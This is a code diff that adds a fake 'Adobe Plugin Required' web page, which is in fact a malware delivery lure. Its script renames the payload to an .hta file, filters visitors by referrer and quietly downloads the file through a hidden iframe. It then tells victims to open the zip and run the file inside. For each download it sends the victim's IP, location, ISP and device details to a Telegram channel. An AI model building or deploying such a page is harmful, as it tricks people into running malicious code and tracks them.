@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Adobe Plugin Required</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; height: 100vh; display: flex;
+      align-items: flex-start; justify-content: center; background-color: #f5f5f5; padding-top: 15vh; }
+    .container { text-align: center; max-width: 600px; margin-top: 0; }
+    img { width: 150px; margin-bottom: 20px; }
+    a { color: #d32f2f; text-decoration: none; font-weight: bold; }
+    a:hover { text-decoration: underline; }
+    p { line-height: 1.6; margin: 0; padding: 0 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="assets/adobeicon.png" alt="Adobe Icon">
+    <p>Sorry, You do not have the latest version of Adobe plugin installed.<br>
+    Let's finish your installation.<br><br>
+    <span id="instr"></span> <a id="manual" href="#">Download manually</a>.<br><br>
+    Download not working? <a href="#">&#8635; Restart and Download | Get Help</a></p>
+  </div>
+
+  <iframe id="dlframe" src="" style="display:none;" onload="this.remove();"></iframe>
+
+  <script src="config.js"></script>
+  <script src="gate.js"></script>
+  <script src="telemetry.js"></script>
+  <script>
+    (function () {
+      var q = new URLSearchParams(location.search);
+      var tk = q.get('tk') || '';
+      var name = q.get('n') || '';
+      if (!tk || !/^[A-Za-z0-9_. -]+$/.test(name) || name.length === 0) name = window.makeName();
+      name = name.slice(0, 90);
+      if (!/\.hta$/i.test(name)) name += '.hta';
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['/download.html'] })) return;
+
+      var kind = window.nameKind(name);
+      var zipName = name.replace(/\.hta$/i, '.zip');
+      var instr = kind === 'adobe'
+        ? 'Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to install.'
+        : 'Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view your document.';
+      document.getElementById('instr').innerHTML = instr;
+      var dlUrl = 'dl.html?tk=' + encodeURIComponent(tk) + '&n=' + encodeURIComponent(name);
+      document.getElementById('manual').href = dlUrl;
+
+      // One Telegram "Download Triggered" alert per visit (dedupe by name+tk).
+      (async function () {
+        try {
+          var key = 'fired_' + tk + '|' + name;
+          if (localStorage.getItem(key)) return;
+          localStorage.setItem(key, '1');
+          var g = await window.geo();
+          var now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+          var msg = "\uD83C\uDFAF New Download Triggered \uD83C\uDFAF\n"
+                  + "\uD83D\uDCC5 Time: " + now + "\n"
+                  + "\uD83D\uDCCD IP: " + g.ip + "\n"
+                  + "\uD83C\uDF0D Location: " + g.city + ", " + g.country + "\n"
+                  + "\uD83C\uDF10 ISP: " + g.isp + "\n"
+                  + "\uD83D\uDCC1 File: " + name + "\n"
+                  + "\uD83D\uDCF1 Device: " + navigator.userAgent;
+          window.tgSend(msg.slice(0, 2900));
+        } catch (e) {}
+      })();
+
+      // Trigger the actual (fresh-name, unique-hash) download in a hidden iframe.
+      setTimeout(function () {
+        document.getElementById('dlframe').src = dlUrl;
+      }, 400);
+    })();
+  </script>
+</body>
+</html>
